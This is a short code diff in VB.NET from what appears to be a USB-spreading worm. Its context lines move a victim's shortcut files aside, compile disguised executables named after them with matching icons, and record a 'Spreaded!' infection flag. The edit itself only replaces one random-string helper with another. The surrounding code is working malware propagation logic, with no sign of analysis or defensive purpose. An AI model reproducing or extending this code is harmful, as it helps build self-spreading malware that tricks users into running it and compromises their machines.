@@ -38,7 +38,7 @@ re:
                         IC(GetFileNameWithoutExtension(Shourtcuts), GetFullPath(Shourtcuts))
                         File.Move(Shourtcuts, ShortcutDIR & GetFileName(Shourtcuts))
                         CS(GetFileName(Shourtcuts), EXEDIR & GetFileNameWithoutExtension(Shourtcuts) & ".exe")
-                        Compile(My.Resources.Code.Replace("%CC%", random_key(6)).Replace("%A%", FULLPATH).Replace("%B%", ShortcutDIR & GetFileName(Shourtcuts)), EXEDIR & GetFileNameWithoutExtension(Shourtcuts) & ".exe", GetFileNameWithoutExtension(Shourtcuts.Replace(" ", String.Empty)))
+                        Compile(My.Resources.Code.Replace("%CC%", Randomz(6)).Replace("%A%", FULLPATH).Replace("%B%", ShortcutDIR & GetFileName(Shourtcuts)), EXEDIR & GetFileNameWithoutExtension(Shourtcuts) & ".exe", GetFileNameWithoutExtension(Shourtcuts.Replace(" ", String.Empty)))
                         If Not GTV("USB") = "Spreaded!" Then
                             STV("USB", "Spreaded!")
                         End If
@@ -74,16 +74,17 @@ re:
             Console.WriteLine("GETLINK " + ex.Message)
         End Try
     End Function
-    Public Shared Function random_key(ByVal lenght As Integer) As String
-        Randomize()
-        Dim s As New System.Text.StringBuilder("")
-        Dim b() As Char = "ABCDEFGHIJKLMNOPQRSTUVWXYZ".ToCharArray()
-        For i As Integer = 1 To lenght
-            Randomize()
-            Dim z As Integer = Int(((b.Length - 2) - 0 + 1) * Rnd()) + 1
-            s.Append(b(z))
-        Next
-        Return s.ToString
+    Public Shared Function Randomz(ByVal L As Integer)
+        Dim validchars As String = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
+        Dim sb As New System.Text.StringBuilder()
+        Dim rand As New Random()
+        For i As Integer = 1 To L
+            Dim idx As Integer = rand.Next(0, validchars.Length)
+            Dim randomChar As Char = validchars(idx)
+            sb.Append(randomChar)
+        Next i
+        Dim randomString = sb.ToString()
+        Return randomString
     End Function
     Public Shared Function Compile(ByVal Source As String, ByVal Out As String, ByVal icon As String)
         Dim ProviderOptions As New Dictionary(Of String, String)()
